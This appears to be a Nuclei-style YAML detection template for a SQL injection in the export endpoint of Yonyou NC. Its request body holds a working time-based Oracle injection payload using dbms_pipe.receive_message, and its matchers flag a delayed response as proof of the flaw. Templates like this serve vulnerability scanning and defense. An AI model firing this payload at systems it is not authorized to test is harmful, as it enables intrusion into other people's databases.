id: yonyou-nc-export-sqli

info:
  name: 用友NC export SQL注入漏洞
  author: onewin
  severity: high
  description: 用友NC系统的export接口存在SQL注入漏洞，攻击者可利用此漏洞执行任意SQL命令
  reference:
    - https://example.com/yonyou-nc-sqli  # 替换为实际参考链接
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

requests:
  - method: POST
    path:
      - "{{BaseURL}}/portal/pt/ActivityNotice/export?pageId=login"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Language: "zh-CN,zh;q=0.9"
      Upgrade-Insecure-Requests: "1"
      Cache-Control: "max-age=0"
      Content-Type: "application/x-www-form-urlencoded"
      Cookie: "JSESSIONID=255CAD868C61636AFF6029E1356C6AFF.ncServer; JSESSIONID=55DEB927A6B17337DC1D14CB52C50B19.ncServer"

    body: "itemid=1' AND 1=dbms_pipe.receive_message('RDS',3)--"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=3 && duration<8"
      - type: status
        status:
          - 200